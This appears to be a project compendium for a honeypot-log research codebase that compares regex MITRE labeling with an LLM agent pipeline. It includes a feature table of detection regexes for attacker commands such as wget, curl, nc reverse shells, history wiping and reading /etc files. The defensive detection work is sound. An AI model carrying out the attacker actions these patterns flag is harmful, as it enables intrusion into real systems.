# Cowrie Log Analysis — Project Compendium

**A single, complete reference for the `cowrie-log-analysis` project.**

This document consolidates everything the project has produced across all
sessions to date: the research question, the data, every module and script,
the production run and its failure/recovery history, the measured results and
what they mean, the human-annotation program, the forward plan, and a full
inventory of known bugs and limitations.

It is written to be read cold. It does not assume you have seen the codebase,
the earlier plans, or any prior session. Where a claim comes from code, the
file (and where useful, the symbol) is cited so you can verify it.

- **Repository:** `Herweg-Jake/cowrie-log-analysis`
- **Package:** `cowrie-dataset` v0.1.0 (`src/cowrie_dataset/`), Python ≥ 3.10
- **Production host:** `jake1@honeypot-data`, checkout at `/opt/cowrie-log-analysis`
- **Elasticsearch:** `http://192.168.3.130:9200`, index `cowrie-sessions`
- **Corpus:** 11,711,491 SSH/Telnet honeypot sessions, six sensors, 2020–2021
- **Document status:** reflects repository state as of commit `c130880`

---

## Table of Contents

1. [Project at a glance](#1-project-at-a-glance)
2. [The research question](#2-the-research-question)
3. [Chronology: how the project got here](#3-chronology-how-the-project-got-here)
4. [Data foundation](#4-data-foundation)
5. [End-to-end architecture](#5-end-to-end-architecture)
6. [Component reference](#6-component-reference)
   - [6.1 Configuration](#61-configuration-srccowrie_datasetconfigpy)
   - [6.2 Parser](#62-parser-srccowrie_datasetparserscowrie_parserpy)
   - [6.3 Session aggregator](#63-session-aggregator-srccowrie_datasetaggregatorssession_aggregatorpy)
   - [6.4 Feature extraction (F1–F52)](#64-feature-extraction-f1f52)
   - [6.5 Pipeline A — the MITRE labeler](#65-pipeline-a--the-mitre-labeler-srccowrie_datasetlabelingmitre_labelerpy)
   - [6.6 Session exporter](#66-session-exporter-srccowrie_datasetexportsession_exporterpy)
   - [6.7 Statistical anomaly detector](#67-statistical-anomaly-detector-srccowrie_datasetanomalystatistical_detectorpy)
   - [6.8 Pipeline B — the agent layer](#68-pipeline-b--the-agent-layer-srccowrie_datasetagents)
   - [6.9 Elasticsearch sink](#69-elasticsearch-sink-srccowrie_datasetsinkselasticsearch_sinkpy)
   - [6.10 CLI](#610-cli-srccowrie_datasetclipy)
7. [Scripts reference](#7-scripts-reference)
8. [The production run](#8-the-production-run)
9. [Results in full](#9-results-in-full)
10. [Reading the results](#10-reading-the-results-what-the-disagreements-actually-mean)
11. [The human annotation program](#11-the-human-annotation-program)
12. [The forward plan: cost-stratified multi-pipeline](#12-the-forward-plan-cost-stratified-multi-pipeline)
13. [Known bugs, limitations, and technical debt](#13-known-bugs-limitations-and-technical-debt)
14. [Operations runbook](#14-operations-runbook)
15. [Schema appendices](#15-schema-appendices)
16. [Glossary](#16-glossary)
17. [Open questions and decisions pending](#17-open-questions-and-decisions-pending)

---

## 1. Project at a glance

The project takes raw Cowrie SSH/Telnet honeypot logs — gzipped JSON-lines,
one event per line, from six globally distributed sensors — and turns them
into labeled, ML-ready session records. It then runs **two independent
labeling pipelines over the identical session data** and compares them:

| | Pipeline A | Pipeline B |
|---|---|---|
| **Name in code** | `labels_rule_based` | `labels_agentic` |
| **Method** | Deterministic regex → MITRE tactic + threat level | Z-score anomaly gate → LLM Hunter (triage) → LLM Analyst (classify) |
| **Implementation** | `src/cowrie_dataset/labeling/mitre_labeler.py` | `src/cowrie_dataset/agents/` + `src/cowrie_dataset/anomaly/` |
| **Throughput** | ~10,000 sessions/sec (est.) | ~7.8 s of model latency per gated session |
| **Cost** | $0 | $0 as run (Gemini 2.5 Flash, free/credit tier; price table set to zero) |
| **Coverage** | All 11.7M sessions | 44,280 gated sessions (0.38%) |
| **Output** | level (1–3), primary tactic, all tactics, matched patterns, behavior tag, kill-chain flag, obfuscation flag, sophistication 1–5 | level (1–3), primary tactic, all tactics, technique IDs, sophistication enum, intent, free-text reasoning, confidence, IOCs |

Both pipelines write into the same session record, side by side, which is what
makes the comparison possible. A third label source — **human ground truth** —
is the missing piece the project is currently building toward, because
pipeline-vs-pipeline agreement measures consistency, not correctness.

**The headline empirical result so far:** on 8,514 sessions where both
pipelines produced comparable labels, they agree on the primary MITRE tactic
**41.5%** of the time and on threat level **41.2%** of the time. Neither number
tells you which pipeline is right — that is exactly the gap the annotation
program closes.

---

## 2. The research question

### 2.1 The core question

*What does an LLM agent actually add to honeypot threat classification, and is
it worth the cost?*

Rule-based labeling of honeypot sessions is cheap, deterministic, auditable,
and instant. LLM labeling is slow, non-deterministic, expensive at scale, and
hard to audit — but it reads context, handles commands nobody wrote a regex
for, produces natural-language reasoning, and can name techniques it was never
explicitly told about. The project exists to quantify that trade-off on real
data rather than argue it in the abstract.

### 2.2 The original five hypotheses

Stated in `docs/IMPLEMENTATION_PLAN.md`, Appendix D. These drove the first
phase of work and each has a corresponding measurement in
`scripts/analyze_disagreements.py` / `scripts/cost_benefit_analysis.py`.

| # | Hypothesis | Metric | Pre-registered expectation | Status |
|---|---|---|---|---|
| H1 | Agents identify attacker intent more accurately | Tactic disagreement rate, adjudicated by manual review | Agent correct in >70% of disagreements | **Not yet testable** — needs ground truth. 4,982 disagreements are queued for adjudication |
| H2 | Agents detect novel attacks rules miss | Sessions with zero rule pattern matches but agent level ≤ 2 | >5% of high-threat sessions | **Met on the reliable measure**: 1,617 / 8,833 = 18.3%. (The 0.6% figure in the disagreement report is a measurement bug — see §13.1) |
| H3 | Hunter reduces false positives | Fraction of gated sessions filtered as NOISE | >60% | **Met**: 80.1% — with a caveat about parse-failure bias (§13.2) |
| H4 | Agent cost is acceptable | Cost per novel finding | <$1.00 | **Vacuously met**: $0.00, because the configured price table is zero. Uninformative as run (§13.3) |
| H5 | Sophistication scoring improves triage | Correlation with manual review | >0.8 | **Not yet testable.** Distribution is degenerate: 7,458 SCRIPT_KIDDIE / 877 INTERMEDIATE / 179 UNKNOWN, zero ADVANCED, zero APT |

### 2.3 How the framing evolved

The framing has shifted twice, and the shift matters for anyone picking up the
work:

1. **v1 (Jan 2026, `docs/IMPLEMENTATION_PLAN.md`):** "rules vs agents,"
   measured by inter-pipeline agreement. Two pipelines, one Elasticsearch
   index, side-by-side labels, Kibana for exploration.

2. **v2 (Apr 2026, `HUMAN_ANNOTATION_PLAN.md`):** agreement is not accuracy.
   Introduce blind human annotation over a stratified sample to produce ground
   truth, then grade *both* pipelines against it with precision/recall/F1,
   McNemar's test, bootstrap CIs, and a superiority-vs-non-inferiority framing.
   Explicitly motivated by feedback from the project's advisors, including the
   point that **false negatives cost more than false positives** in a security
   context.

3. **v3 (May 2026, `IMPLEMENTATION_PLAN (1).md`):** the two-pipeline
   comparison is too narrow to publish. A reviewer will immediately ask whether
   a plain gradient-boosted classifier on the existing engineered features
   captures most of the LLM's gains for a thousandth of the cost. The new
   framing is a **cost-stratified comparison across the rule / ML / LLM design
   space**, with a cost-quality Pareto frontier and a named failure-mode
   taxonomy as the paper's contributions.

The stated headline finding at v3 is worth quoting because it is the
interpretive thesis the rest of the work is testing:

> Pipeline A is more precise *when its rules fire* but has a catastrophic
> silent-failure mode (`No Action` / `Unknown Activity` on real attacks).
> Pipeline B closes that blind spot but systematically undercalls severity and
> overuses `Initial Access` as a default.

### 2.4 Methodological constraints (binding)

From `IMPLEMENTATION_PLAN (1).md` §1.5. These are not suggestions; violating
them invalidates published results:

1. **Do not modify Pipeline A or Pipeline B classification logic.** Their
   outputs are a locked baseline. Bugs get *documented*, not silently fixed.
   (`docs/IMPLEMENTATION_PLAN.md` §1.2 suggests `git tag baseline-rules-v1.0`
   to pin this; the tag does not currently exist.)
2. **Annotators never see pipeline labels.** Blind annotation only.
3. **Inter-pipeline agreement is not accuracy.** Only ground truth supports
   accuracy claims.
4. **False negatives cost more than false positives.** Metrics must reflect it.
5. **Preserve raw outputs.** Every run writes its own sidecar JSONL keyed by
   `session_id`. Never overwrite the master file. (This rule was written
   *after* the master file was overwritten five times with no backup — see §8.)

---

## 3. Chronology: how the project got here

Reconstructed from git history, the debrief document, and the plans. Dates are
commit dates.

### Phase 0 — Foundation (2025-12-18)

`a8b2662` **Initial commit.** The entire non-agentic pipeline lands at once:
parser, session aggregator, all three feature extractors, MITRE labeler,
Elasticsearch sink, config, CLI, MVP test script, docker-compose for ES +
Kibana. `c213e76`/`b503101` immediately follow to get `.env` out of the repo.

### Phase 1 — Research plan and comparison scaffolding (2026-01-07)

- `6de2e3e` **The dual-pipeline implementation plan** (`docs/IMPLEMENTATION_PLAN.md`,
  2,110 lines). This document is unusual: it contains complete, ready-to-paste
  implementations of every module in Phases 1–5. Most of the code that follows
  is a lightly-edited version of what this plan specifies.
- `19b714f` **Session exporter** (Phase 1.3) + `scripts/verify_session_schema.py`.
  The exporter is the "single source of truth" that guarantees both pipelines
  see byte-identical input.
- `9caff88` **Statistical anomaly detector** (Phase 2) + training script.
  Welford's online algorithm for running mean/variance over 13 selected
  features.

### Phase 2 — The agent layer (2026-01-12, a single intense day)

Eight commits in one day, tracking a fast iteration loop against a live API:

- `ea1b5c0` Agent infrastructure: `base.py`, `hunter.py`, `analyst.py`, `runner.py`.
- `84eec7f` Gemini support added alongside Anthropic/OpenAI.
- `9e017cd` Migrate to the new `google-genai` SDK; default model → Gemini 2.0 Flash.
- `1587e08` Handle Google 429 quota errors properly — parse `retryDelay` out of
  the error payload instead of blind exponential backoff.
- `d9d317a` Vertex AI support, so the run can burn Google Cloud credits instead
  of hitting AI Studio free-tier rate limits.
- `9207374` `scripts/run_agent_pipeline.py` and `scripts/index_to_elastic.py`.

### Phase 3 — Making Pipeline A competitive (2026-01-12 → 2026-03-09)

A deliberate effort to prevent the comparison from being a straw man. A naive
regex baseline would lose to an LLM trivially and prove nothing.

- `5980b0e`/`e082261` **Labeler v2**: kill-chain detection (multi-stage attack
  combos upgrade severity), base64/hex de-obfuscation before pattern scanning,
  behavioral tagging (MACHINE_SPEED vs HUMAN_SPEED from inter-command timing),
  and splitting "unknown" into High/Low complexity tiers.
- `88169dd` v2 label fields added to the ES mapping and exporter.
- `580ac06` **Labeler v3**: sophistication scoring (1–5), tactic count,
  download/upload flags, plus new features (min inter-command gap, max command
  length, command diversity ratio, pipe/redirect presence,
  password-equals-username, scanner-client flag).
- `11e6729` **Concurrency**: `ThreadPoolExecutor` in the pipeline runner, RPM
  ceiling raised 15 → 500. This is what made an 11.7M-session run feasible.
- `38e3a00`, `ef9c497`, `fd5bdfc` Operational fixes: accept `GEMINI_API_KEY` as
  a fallback, auto-load `.env` in scripts, default model → `gemini-2.5-flash`
  (2.0 retired).

### Phase 4 — The production run and its aftermath (2026-04-02)

The full corpus was processed, and then a long error-recovery effort followed.
Documented in detail in `docs/error_recovery_debrief.md` and summarized in §8.

- `e62a7fe` `_extract_json()` for markdown-fenced LLM responses; retry and
  analysis scripts.
- `c3579eb` **The `max_tokens` fix**: 1024 → 4096. This one-line change was the
  root cause of 93% of analyst results being silent parse failures.
- `08e3c5d`, `8707ccb` Final analysis outputs committed
  (`src/disagreement_results.json`, `src/cost_report.json`).
- `c139a9b` The error-recovery debrief.

### Phase 5 — Ground truth (2026-04-14 → 2026-04-22)

- `06566bd` `HUMAN_ANNOTATION_PLAN.md` — the five-phase plan for producing
  human ground truth and grading both pipelines against it.
- `32f421a` **Phases 1–4 implemented in one commit**:
  `scripts/analyze_patterns.py`, `scripts/extract_annotation_sample.py`,
  `scripts/compute_ground_truth_metrics.py`, `docs/ANNOTATION_CODEBOOK.md`,
  and a self-contained browser annotation tool (`scripts/annotate/index.html`).
- `94bffb6`/`0abb88e` Schema fix: the new scripts were reading the *nested*
  session schema (`meta.session_type`, `timing.duration_s`,
  `authentication.success`) when the actual master file uses the *flat*
  `ExportedSession` schema. See §13.5 — one instance of this bug survives.

### Phase 6 — Rescoping (2026-05-06)

- `c130880` `IMPLEMENTATION_PLAN (1).md` uploaded. A new seven-phase plan
  written to be handed to a fresh agent session: metrics refactor, a classical
  ML Pipeline C, multi-LLM Pipeline B variants, a local-model variant,
  comprehensive evaluation, failure-mode taxonomy, reproducibility artifacts.
  It also reveals that an LLM annotation pass (Claude Sonnet 4 over 345
  stratified sessions) has already been completed on the server.

---

## 4. Data foundation

### 4.1 The sensor fleet

Six Cowrie honeypots, named by city, configured in `.env` via `LOCATIONS` and
defaulted in `src/cowrie_dataset/config.py::_parse_locations`:

```
ssh-amsterdam   ssh-bangalore   ssh-london
ssh-ny          ssh-singapore   ssh-toronto
```

Geographic spread is deliberate: it lets you ask whether attack populations
differ by sensor location, and it means models must not be allowed to leak
sensor identity (hence the "stratify cross-validation by sensor" instruction in
the Pipeline C plan).

> **Naming caution.** The forward plan (`IMPLEMENTATION_PLAN (1).md` §1.3) uses
> a `sensor` field with values `amsterdam|bangalore|...`. The actual data uses
> `location` with values `ssh-amsterdam|...`. See §13.9.

### 4.2 On-disk layout

```
/opt/honeypot/
├── ssh-amsterdam/
│   ├── cowrie.json.2020_10_1.gz
│   ├── cowrie.json.2020_10_2.gz
│   └── ...
├── ssh-bangalore/
└── ...
```

One gzipped JSON-lines file per sensor per day. The parser sorts by the date
embedded in the filename (`CowrieParser._extract_date_from_filename`), handling
both `cowrie.json.YYYY_M_D.gz` and `cowrie_json.YYYY_MM_DD.gz`. Unparseable
filenames sort last via a `(9999, 99, 99)` sentinel.

### 4.3 Cowrie event types consumed

The aggregator dispatches on `eventid`. Everything not in this list (e.g.
`cowrie.client.size`) is counted toward `event_count` and otherwise ignored.

| Event ID | What the aggregator extracts |
|---|---|
| `cowrie.session.connect` | src_ip, src_port, dst_ip, dst_port, protocol |
| `cowrie.client.version` | SSH client version string (JSON field is `version`) |
| `cowrie.client.kex` | `hassh` fingerprint and `hasshAlgorithms` |
| `cowrie.login.success` | username, password; sets `auth_success = True` |
| `cowrie.login.failed` | username, password (recorded as a failed attempt) |
| `cowrie.command.input` | command text, marked `success=True` |
| `cowrie.command.failed` | command text, marked `success=False` |
| `cowrie.session.file_download` | url, shasum, outfile |
| `cowrie.session.file_upload` | shasum, destfile |
| `cowrie.direct-tcpip.request` | dst_ip, dst_port (tunneling attempt) |
| `cowrie.session.closed` | authoritative duration; marks session complete |

**Reading `success` correctly:** `success=True` on a command means *Cowrie
recognized the command*, not that the attacker achieved anything. Cowrie is a
medium-interaction honeypot returning fabricated responses. The annotation
codebook is explicit about this: grade *intent*, not outcome.

### 4.4 Scale

| Quantity | Value |
|---|---|
| Total sessions | 11,711,491 |
| Master labeled file (`src/labeled_sessions.jsonl`) | ~38 GB, one JSON object per line |
| Pre-labeling export (`src/sessions_all.jsonl`) | ~31 GB — **deleted** to free disk |
| Sessions with any Pipeline A pattern match | 39,027 (0.333%) |
| Sessions flagged as statistical anomalies | 44,280 (0.378%) |
| Sessions reaching the Analyst | 8,833 |
| Sessions with usable dual labels | 8,514 |

The 0.33% pattern-match rate is the single most important shape fact about this
dataset: **more than 99.6% of sessions are failed brute-force noise.** Every
design decision downstream — the anomaly gate, the Hunter triage stage, the
stratified sampling — exists because of that ratio.

---

## 5. End-to-end architecture

```
                        /opt/honeypot/<sensor>/cowrie.json.*.gz
                                        │
                                        ▼
                    ┌───────────────────────────────────┐
                    │ CowrieParser                      │   streams events,
                    │ parsers/cowrie_parser.py          │   skips bad lines
                    └───────────────┬───────────────────┘
                                    ▼
                    ┌───────────────────────────────────┐
                    │ SessionAggregator                 │   groups by session id,
                    │ aggregators/session_aggregator.py │   emits on session.closed
                    └───────────────┬───────────────────┘
                                    ▼
                    ┌───────────────────────────────────┐
                    │ Feature extraction  F1–F52        │
                    │ features/{message,host,geo}_*.py  │
                    └───────────────┬───────────────────┘
                                    ▼
                    ┌───────────────────────────────────┐
                    │ export_session()  → ExportedSession│  ← SINGLE SOURCE OF TRUTH
                    │ export/session_exporter.py        │     both pipelines read this
                    └───────────────┬───────────────────┘
                                    │
              ┌─────────────────────┴─────────────────────┐
              ▼                                           ▼
  ┌───────────────────────────┐             ┌─────────────────────────────────┐
  │ PIPELINE A (in-line)      │             │ PIPELINE B (offline, JSONL)     │
  │ MitreLabeler.label()      │             │                                 │
  │ regex → level + tactics   │             │  StatisticalAnomalyDetector     │
  │                           │             │  z > 3.0 on any of 13 features  │
  │ → labels_rule_based       │             │            │ 0.38% pass         │
  └────────────┬──────────────┘             │            ▼                    │
               │                            │  HunterAgent → RELEVANT/NOISE   │
               │                            │            │ 20% pass           │
               │                            │            ▼                    │
               │                            │  AnalystAgent → MITRE + reasons │
               │                            │                                 │
               │                            │ → labels_agentic                │
               │                            └────────────┬────────────────────┘
               └───────────────────┬─────────────────────┘
                                   ▼
                    ┌───────────────────────────────────┐
                    │ index_to_elastic.py               │  adds label_comparison
                    │ → ES index `cowrie-sessions`      │  → Kibana
                    └───────────────────────────────────┘
                                   │
                                   ▼
        analyze_disagreements.py · cost_benefit_analysis.py · analyze_patterns.py
                                   │
                                   ▼
        extract_annotation_sample.py → blind sample → human/LLM annotation
                                   │
                                   ▼
                    compute_ground_truth_metrics.py → accuracy, F1, kappa,
                                   McNemar, bootstrap CI, FN rates
```

### 5.1 Two document shapes — the structural gotcha

This trips up every new script, so state it plainly. **The project produces two
different JSON shapes for a session**, and they are not interchangeable:

| | Nested shape | Flat shape |
|---|---|---|
| Produced by | `Session.to_dict()` → `cli.py::build_session_document` | `export_session()` → `ExportedSession` |
| Used by | direct `--location` ES ingest path | `--export` JSONL path, **and therefore the entire agent pipeline and all analysis** |
| Session type | `meta.session_type` | `session_type` |
| Duration | `timing.duration_s` | `duration_s` |
| Auth success | `authentication.success` | `auth_success` |
| Commands | `commands` = dict with `total_count`/`inputs` (capped at 100) | `commands` = list of `{timestamp, input, success}` |
| Downloads | `downloads` = dict with `count`/`urls` | `downloads` = list of dicts |
| SSH version | `client.ssh_version` | `ssh_version` |
| Geo in features? | yes | no (geo only in the separate `geo` block) |

`src/labeled_sessions.jsonl` — the master file everything downstream reads —
is in the **flat** shape. The ES mapping in `elasticsearch_sink.py` is written
for the **nested** shape. Both are true at once, which is why re-indexing the
master file produces documents that only partly match the mapping (§13.4).

---

## 6. Component reference

### 6.1 Configuration (`src/cowrie_dataset/config.py`)

A `Settings` dataclass whose fields default from environment variables, loaded
from `.env` via `python-dotenv` at import time. A module-level `settings`
singleton is created on import for convenience.

| Variable | Purpose | Default |
|---|---|---|
| `ES_HOST` | Elasticsearch URL | `http://localhost:9200` |
| `ES_USER` / `ES_PASSWORD` | Optional basic auth | unset |
| `ES_INDEX_PREFIX` | Index name prefix | `cowrie-sessions` |
| `HONEYPOT_DATA_DIR` | Root of sensor directories | `/opt/honeypot` |
| `GEOLITE_DB_PATH` | Path to `GeoLite2-City.mmdb` | unset → geo disabled |
| `BULK_SIZE` | Docs buffered before a bulk index call | `500` |
| `LOCATIONS` | Comma-separated sensors, or `all` | `all` → the six defaults |
| `GOOGLE_API_KEY` / `GEMINI_API_KEY` | AI Studio key (free tier) | unset |
| `GOOGLE_CLOUD_PROJECT` | Set → route Gemini through **Vertex AI** instead | unset |
| `GOOGLE_CLOUD_LOCATION` | Vertex region | `us-central1` |
| `ANTHROPIC_API_KEY` / `OPENAI_API_KEY` | Read by `AgentConfig` when provider matches | unset |

Two helpers: `get_location_path(location)` joins data dir + sensor name;
`get_index_name(suffix="")` builds the index name (single index for now, with
a hook for time-based indices later).

**The Vertex switch is significant operationally.** Setting
`GOOGLE_CLOUD_PROJECT` flips `BaseAgent._get_client` from an API-key AI Studio
client to a Vertex client using application-default credentials. During the
error-recovery run, this variable being commented out in `.env` was the reason
a retry job ran at ~10 sessions/min instead of the expected rate.

### 6.2 Parser (`src/cowrie_dataset/parsers/cowrie_parser.py`)

Deliberately dumb: read, parse, yield. All intelligence is downstream.

**`CowrieEvent`** — a dataclass flattening the raw JSON into typed fields. Every
field except `event_id`, `timestamp`, `session`, `src_ip` is `Optional`, because
Cowrie event types carry disjoint field sets. The full raw dict is retained on
`.raw` for anything not explicitly extracted (the tunneling handler uses this).
`source_file` and `line_number` are attached for debugging.

**`parse_timestamp(ts_str)`** — Cowrie emits ISO-8601 with a `Z` suffix
(`2021-01-09T00:00:01.916929Z`). Python's `fromisoformat` historically rejects
`Z`, so it is rewritten to `+00:00`; four `strptime` formats are then tried as
fallbacks for truncated or missing microseconds. A total failure logs a warning
and substitutes `datetime.now()`, which is bad but non-fatal.

**`CowrieParser.parse_file(path)`** — opens `.gz` via `gzip.open(mode='rt')` or
plain files directly, always with `encoding='utf-8', errors='replace'`. Yields
one `CowrieEvent` per line. `json.JSONDecodeError` and any other per-line
exception increments `self.errors` and continues — a corrupt line never kills a
multi-hour run. Failure to *open* the file does raise.

**`parse_directory(path, pattern="cowrie*.gz", limit=None, sort_by_date=True)`**
— globs, sorts chronologically, optionally truncates to the first N files, and
chains `parse_file` over them. Chronological order matters for session merging
across midnight boundaries.

**`get_stats()`** → `{files_parsed, events_parsed, errors}`.

### 6.3 Session aggregator (`src/cowrie_dataset/aggregators/session_aggregator.py`)

**`Session`** — the accumulator. Holds connection info, timing, client
fingerprint, `login_attempts` as a list of `(username, password, success)`
tuples, `commands` as a list of `{timestamp, input, success}` dicts, downloads,
uploads, TCP-forward requests, the set of source files seen, an event count,
and an `is_closed` flag.

`add_event()` updates `start_ts`/`end_ts` as running min/max over all event
timestamps (not just connect/close), then dispatches to a per-event handler.

**`get_computed_duration()`** prefers the authoritative `duration` from
`cowrie.session.closed`; falls back to `end_ts - start_ts`; returns `0.0` if
neither is available. This value feeds `F44_duration` and every rate-based
feature, so sessions with no close event get a duration derived purely from
observed event spread.

**`get_session_type()`** — a three-way classification used everywhere
downstream:

- `failed_auth_only` — never authenticated
- `success_no_commands` — authenticated, ran nothing
- `success_with_commands` — authenticated and ran at least one command

**`SessionAggregator`** — an in-memory `dict[session_id → Session]`. `add_event`
returns a list containing the session iff this event was `session.closed`
(removing it from the store); otherwise an empty list. `flush()` yields all
sessions that never closed and clears the store.

Two consequences worth knowing:

1. **Memory is unbounded in the number of concurrently-open sessions.** The
   module docstring acknowledges this and defers a disk-backed store as
   over-engineering. At honeypot scale, open sessions are short-lived so this
   holds, but a slowloris-style attack would stress it.
2. **A separate aggregator per sensor** means a session ID reused across
   sensors produces two distinct `Session` objects — correct — but they can
   collide later at the Elasticsearch document-ID level (§13.4).

**`Session.to_dict()`** produces the *nested* document shape (§5.1) with
`commands.inputs` capped at 100 entries and `downloads.urls`/`shasums` capped
at 20 — a storage guard that means the nested shape is lossy for high-volume
sessions. The flat exporter has no such cap.

### 6.4 Feature extraction (F1–F52)

Three modules, one per family. The numbering follows the AI@NTDS paper
(Wang et al., 2022, IEEE 9780124) that inspired the project, with local
additions prefixed `extra_`.

> **Feature-count note.** The README says "52 behavioral features." The actual
> emitted key count is higher: 38 F-numbered message features + 11 `extra_`
> message features + 8 F-numbered host features (expanded into ~14 keys) +
> 7 host extras + 7 F-numbered geo features (as 9 keys). Roughly **80 keys**
> in the flat export path. Cite key names, not counts.

#### 6.4.1 Message features (`features/message_features.py`)

All patterns are compiled once at module import. Two counting helpers:
`count_pattern` counts *commands that match* (max 1 per command);
`count_all_matches` counts *total matches* (used for hex and URLs).

| ID | Key | Pattern / definition |
|---|---|---|
| F1 | `F1_keyword_bash` | `\bbash\b` |
| F2 | `F2_keyword_shell` | `\bsh(?:ell)?\b` |
| F3 | `F3_keyword_exit` | `\bexit\b` |
| F4 | `F4_keyword_help` | `\bhelp\b` |
| F5 | `F5_keyword_passwd` | `\bpasswd\s+\w+` |
| F6 | `F6_keyword_chpasswd` | `\bchpasswd\b` |
| F7 | `F7_keyword_useradd` | `\buseradd\b` |
| F8 | `F8_keyword_dot_file` | `^\.\s+\S+` or `;\s*\.\s+\S+` (shell `source`) |
| F9 | `F9_keyword_sh_file` | `\bsh\s+\S+\.sh` or `\bsh\s+-c` |
| F10 | `F10_keyword_slash_file` | `(?:^|;|\||&&)\s*\./\S+` |
| F11 | `F11_keyword_perl` | `\bperl\s+\S+` |
| F12 | `F12_keyword_python` | `\bpython[23]?\s+\S+` |
| F13 | `F13_keyword_bin` | `/bin/\S+` |
| F14 | `F14_keyword_chmod` | `\bchmod\b` |
| F15 | `F15_keyword_sudo_su` | `sudo su`, `sudo -i`, `sudo bash` |
| F16 | `F16_keyword_rm` | `\brm\s+` |
| F17 | `F17_keyword_history` | `history -[cdw]`, `unset HISTFILE`, `HISTSIZE=0` |
| F18 | `F18_keyword_cat_etc` | `\bcat\s+/etc/` |
| F19 | `F19_keyword_uname` | `\buname\b` |
| F20 | `F20_keyword_wc` | `\bwc\b` |
| F21 | `F21_keyword_crontab` | `\bcrontab\b` |
| F22 | `F22_keyword_w` | `(?:^|\s|;)w(?:\s|$|;)` — the `w` command |
| F23 | `F23_keyword_ps` | `\bps\b` |
| F24 | `F24_keyword_free` | `\bfree\b` |
| F25 | `F25_keyword_lscpu` | `\blscpu\b` |
| F26 | `F26_keyword_nproc` | `\bnproc\b` |
| F27 | `F27_keyword_uptime` | `\buptime\b` |
| F28 | `F28_keyword_wget` | `\bwget\b` |
| F29 | `F29_keyword_tftp` | `\btftp\b` |
| F30 | `F30_keyword_scp` | `\bscp\b` |
| F31 | `F31_keyword_ping` | `\bping\b` |
| F32 | `F32_keyword_kill` | `\bkill\b` |
| F33 | `F33_keyword_reboot` | `reboot`, `shutdown`, `init 0/6` |
| F34 | `F34_count_base64` | `\bbase64\b` |
| F35 | `F35_count_hex` | `\\xNN` or `0x…` — **total matches** |
| F36 | `F36_count_url` | `https?://…` or `ftp://…` — **total matches** |
| F37 | `F37_message_length` | total characters across all commands |
| F38 | `F38_messages_per_sec` | commands ÷ duration (or command count if duration is 0) |

Local additions:

| Key | Definition | Why it exists |
|---|---|---|
| `extra_chars_per_sec` | characters ÷ duration | typing-speed proxy |
| `extra_num_commands` | command count | |
| `extra_avg_cmd_length` | mean command length | |
| `extra_unique_commands` | distinct command strings | loop detection |
| `extra_keyword_curl` | `\bcurl\b` | absent from the paper, ubiquitous in practice |
| `extra_keyword_nc` | `nc`/`netcat`/`ncat` | reverse shells |
| `extra_min_inter_command_gap` | smallest gap between consecutive commands, `-1.0` if <2 timestamps | **the single best automation signal**: <0.05 s is pasted input, not typing |
| `extra_max_cmd_length` | longest single command | |
| `extra_command_diversity_ratio` | unique ÷ total | 1.0 = never repeats; low = stuck bot |
| `extra_has_pipe` | count of commands containing `\|` | |
| `extra_has_redirect` | count of commands containing `>` | |

Sessions with no commands short-circuit to `_empty_message_features()`, which
returns every key zeroed (and `extra_min_inter_command_gap = -1.0`). Keeping
the key set identical for empty sessions is what makes downstream ML and
z-scoring safe.

#### 6.4.2 Host features (`features/host_features.py`)

| ID | Keys | Notes |
|---|---|---|
| F39 | `F39_protocol` | Cowrie's numeric protocol (0 = telnet, 1 = ssh) |
| F40 | `F40_src_port`, `F40_src_port_high` | `_high` = 1 when port > 49152 (ephemeral range) |
| F41 | `F41_ssh_version`, `F41_ssh_family`, `F41_ssh_family_encoded` | family from substring match; ordinal 0–11 |
| F42 | `F42_username`, `F42_username_is_root`, `F42_username_length` | |
| F43 | `F43_password`, `F43_password_length`, `F43_password_is_common` | |
| F44 | `F44_duration` | seconds, rounded to 2 dp |
| F45 | `F45_received_size_avg` | **proxy only** — mean *input* length, because Cowrie logs carry no response sizes. Flagged `TODO` in source |
| F46 | `F46_has_files`, `F46_download_count`, `F46_upload_count` | |

Extras: `extra_hassh`, `extra_login_attempts`, `extra_auth_success`,
`extra_tcpip_forwards`, `extra_dst_port`, `extra_password_equals_username`
(the `root:root` pattern deserved its own flag), `extra_ssh_family_is_scanner`
(1 when the client family is `nmap` or `masscan`).

SSH client families recognized by substring: `openssh`, `putty`, `libssh`,
`dropbear`, `paramiko`, `asyncssh`, `go`→`golang`, `ruby`, `nmap`, `masscan`;
anything else → `other`; missing → `unknown`.

`COMMON_PASSWORDS` is a hand-curated set of ~100 entries in four groups:
classics (`admin`, `123456`, `toor`), OS defaults (`raspberry`, `ubuntu`,
`vagrant`), service accounts (`oracle`, `mysql`, `ftpuser`), and honeypot
favorites (`1qaz2wsx`, `zaq12wsx`, `jenkins`).

**A note on storing credentials:** `F42_username` and `F43_password` retain raw
values. The source comments flag this. Any public data release must decide
whether to hash, drop, or retain these — passwords in honeypot logs occasionally
contain real credentials sprayed from a compromised list.

#### 6.4.3 Geo features (`features/geo_features.py`)

`GeoEnricher` wraps a MaxMind GeoLite2-City `.mmdb` reader. Everything degrades
gracefully: no `geoip2` library, no configured path, missing file, private IP,
or `AddressNotFoundError` all return `_empty_geo_features()`.

| ID | Key |
|---|---|
| F47 | `F47_continent_code` |
| F48 | `F48_country_name`, `F48_country_iso` |
| F49 | `F49_region_name` |
| F50 | `F50_city_name` |
| F51 | `F51_longitude` |
| F52 | `F52_latitude` |

Plus `extra_timezone` and `extra_accuracy_radius`. `_is_private_ip` is a
prefix check on `10.`, `192.168.`, `172.16–31.`, `127.`, `0.` — the source
notes the `ipaddress` module would be more correct.

**Geo was almost certainly not enabled for the production run.** No GeoLite2
database is in the repo, `GEOLITE_DB_PATH` is a placeholder in `.env.example`,
and the flat exporter only calls the enricher when one is passed. Do not build
analysis on geo fields without verifying they are populated.

### 6.5 Pipeline A — the MITRE labeler (`src/cowrie_dataset/labeling/mitre_labeler.py`)

683 lines and the most conceptually loaded module in the project. Understanding
its behavior is essential to interpreting the disagreement results, because
*most disagreements are explained by this file's design choices, not by the LLM
being clever.*

#### 6.5.1 Output: `SessionLabel`

```python
level: int                      # 1 = high, 2 = medium, 3 = low
primary_tactic: str
all_tactics: list[str]
matched_patterns: list[str]     # capped at 20 in to_dict()
behavior_tag: str               # MACHINE_SPEED | HUMAN_SPEED | UNKNOWN_SPEED
kill_chain_detected: bool
obfuscation_detected: bool
sophistication_score: int       # 1-5
tactic_count: int
has_download: bool
has_upload: bool
```

#### 6.5.2 The pattern catalog

**Level 1 (High)** — could cause real damage:

